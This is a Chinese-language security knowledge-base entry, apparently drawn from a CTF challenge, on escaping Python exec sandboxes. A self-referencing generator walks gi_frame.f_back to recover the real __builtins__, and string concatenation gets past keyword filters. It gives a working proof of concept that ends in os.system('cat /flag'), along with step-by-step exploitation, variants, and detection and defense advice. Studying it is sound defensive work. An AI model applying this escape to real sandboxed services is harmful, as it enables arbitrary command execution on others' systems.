---
id: binary-pwn-sandbox-escape-python-generator-frame-builtins-recovery
title: Python 沙箱：生成器 gi_frame 栈帧回溯恢复真实 __builtins__
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: python-generator-frame-builtins-recovery
tags:
- python
- pyjail
- sandbox-escape
- cpython
- frame
- generator
- builtins
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V13
  verified_at: '2026-11-05T01:46:04+08:00'
  notes: 已对照原文与 20 张图核对：生成器自引用 gi_frame.f_back 回溯、[*gen] 驱动、exec globals 置空 builtins 但外层帧仍保留、拼接绕过 __/getattr、3.11 f_back 行为差异均与原文一致；RCE 部分由原文 exp2 的 eval/getattr/__import__ 链证实。未实际执行 PoC
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-python-generator-frame-builtins-recovery/
draft: false
kb_aliases:
- Python 栈帧逃逸
- 生成器 gi_frame
- gi_frame.f_back
- exec 沙箱栈帧
- frame.f_globals 恢复 builtins
- CISCN 2024 mossfern
---

## 一句话结论

当沙箱用 `exec(code, {"__builtins__": None}, None)` 执行用户代码、并过滤 `__`/`getattr`/`sys._getframe` 时，可以用生成器对象在运行时的 `gi_frame.f_back` 链回溯到外层解释器帧，从该帧的 `f_globals['__builtins__']` 取回真实 builtins，再通过 `eval`/`getattr`/`__import__` 执行任意命令。

## 原理

- 任何生成器对象都有 `gi_frame`，指向它自己的栈帧。生成器运行时，CPython 必须维护完整的调用栈，此时 `gi_frame.f_back` 指向驱动它的那一帧；再沿 `f_back` 向上就能到达运行 `exec` 的外层模块帧。
- 关键点是：`exec(code, {"__builtins__": None}, None)` 只把**传给 exec 的全局字典**里的 `__builtins__` 设为 `None`，并不会删除外层解释器帧（runner 模块帧）的 `__builtins__`。生成器帧的 `f_back` 链最终指向 runner 模块帧，其 `f_globals` 里仍是真实的 builtins。
- 在 Python 3.10 及以前，生成器刚创建时 `gi_frame.f_back` 直接指向创建它的帧；Python 3.11+ 中，挂起/未运行的生成器帧可能与调用栈“断开”，`f_back` 为 `None`。因此必须在生成器**正在运行**时取帧：用 `[*gen]`、`list(gen)` 或 `next(gen)` 驱动它。沙箱把 builtins 置空时 `list`/`next` 不可用，但 `[*gen]` 解包语法仍可用。
- 生成器表达式可以引用自身：`gen = (gen.gi_frame.f_back.f_back for i in [1])`。定义时只是编译字节码，不解析 `gen`；`[*gen]` 触发生成器运行时，按 LEGB 找到外层已赋值的 `gen`，从而在生成器内部拿到自己的帧，再从帧回溯。这比在生成器外部访问 `gen.gi_frame` 更稳定，因为外部访问时帧链可能尚未建立。
- 拿到外层帧后，`frame.f_globals['__builtins__']` 可能是 builtins 模块，也可能是 dict；模块形式可 `bti.eval`/`bti.getattr`，dict 形式需 `bti['eval']`/`bti['__import__']`。
- 绕过 `__` 源码过滤用字符串拼接：`'_' + '_' + 'builtins' + '_' + '_'` 在源码中不出现连续 `__`；绕过 `getattr` 过滤用 `eval('bti.get' + 'attr', {'bti': bti})`；绕过 `exit` 过滤用 `'_ex' + 'it'`。

## 触发条件

- 应用把不可信 Python 代码交给 `exec`/`eval`，并通过 `{"__builtins__": None}` 或删减 builtins 做“沙箱”。
- 源码层只做字符串黑名单（常见 `__`、`getattr`、`exit`、`import` 等），没有做 AST 白名单或真正的进程隔离。
- 执行环境仍保留外层解释器帧，且用户代码能创建生成器、访问 `gi_frame`。
- 目标 Python 版本与帧链深度匹配；3.11+ 需要确保生成器正在运行后才取帧。

## 利用步骤

1. 先确认 `exec` 的 globals 中 `__builtins__` 被置空，但 `[*gen]` 语法可用。
2. 用 `gen = (gen.gi_frame.f_back.f_back for i in [1])` 创建自引用生成器；用 `[*gen][0]` 驱动并取出外层帧。
3. 用拼接字符串取 `frame.f_globals['__builtins__']`，判断是模块还是 dict。
4. 用 `bti.eval` + `eval('bti.get' + 'attr', {'bti': bti})` 取 `getattr`，再取 `__import__`。
5. `__import__('os').system('cat /flag')` 或 `popen(...).read()` 执行命令/读文件。
6. 若帧深度不对，按 payload 是否额外包了函数调整 `f_back` 层数（生成器表达式通常两层，helper 函数通常三层）。

## PoC

最小帧回溯 + 恢复 builtins + 命令执行（源码中不出现连续 `__`/`getattr`）：

```python
try:
    [].print()
except:
    pass

gen = (gen.gi_frame.f_back.f_back for i in [1])
frame = [*gen][0]

bti = frame.f_globals['_' + '_' + 'builtins' + '_' + '_']
ev = bti.eval
gta = ev('bti.get' + 'attr', {'bti': bti})
ipt = gta(bti, '_' + '_import_' + '_')
system = ipt('os').system
system('cat /flag')
```

用 helper 函数时多一层 `f_back`（因为多了一个生成器帧）：

```python
def builder():
    yield gen.gi_frame.f_back.f_back.f_back
gen = builder()
frame = [x for x in gen][0]
```

如果只需要枚举外层帧的常量（不执行命令），可先拿 `frame.f_code.co_consts`：

```python
bti = frame.f_globals['_' + '_' + 'builtins' + '_' + '_']
for i in bti.str(frame.f_code.co_consts):
    print(i, end=' ')
```

## 变体与关联

- 变体：`sys._getframe()` 未被过滤时可直接取帧；异常对象 `e.__traceback__.tb_frame` 也可回溯。
- 变体：生成器换成 `async def` 协程的 `cr_frame` 在部分场景可用，但协程必须被 `await`/`send` 驱动，驱动结束帧会被清理；未打通时不要依赖。
- 变体：拿到 builtins 后可用 `eval`/`getattr`/`__import__` 组合绕过 `__`、`getattr`、`import` 等源码过滤。
- 关联：[[binary-pwn-sandbox-escape-python-audit-hook-bypass]]（拿到 builtins 后如何绕过审计钩子）。
- 关联：[[binary-pwn-sandbox-escape-python-jail-subclass-traversal]]（不依赖栈帧、从对象图找 builtins 的另一条路）。
- 关联：[[binary-pwn-sandbox-escape-python-builtins-none-list-dict-alias]]（builtins 置 None 时用别名恢复）。
- 注意：帧链深度与 Python 版本、是否包函数、是否在 `exec` 中直接运行都有关；payload 需要按目标环境微调 `f_back` 次数，不能无条件照搬。

## 检测与防御

- 检测：用户代码中出现 `gi_frame`、`f_back`、`f_globals`、`f_code`、`co_consts`、`tb_frame`、`cr_frame` 等帧属性；出现 `[*gen]`/生成器自引用；出现 `'_' + '_' + 'builtins'` 这类拼接。
- 防御：不要把 `exec`/`eval` 当沙箱；不可信代码必须放到独立进程/容器，使用低权限用户、只读文件系统、无网络和 seccomp。
- 防御：若要限制 Python 层，使用 AST 白名单并禁止 `Attribute`、`Call`、生成器/推导式中的敏感属性；仅清空 `__builtins__` 不够，外层帧仍保留真实 builtins。
- 加固：不要在同一个进程里同时持有 flag 和执行用户代码；把 flag 读取与代码执行隔离到不同进程/权限域。
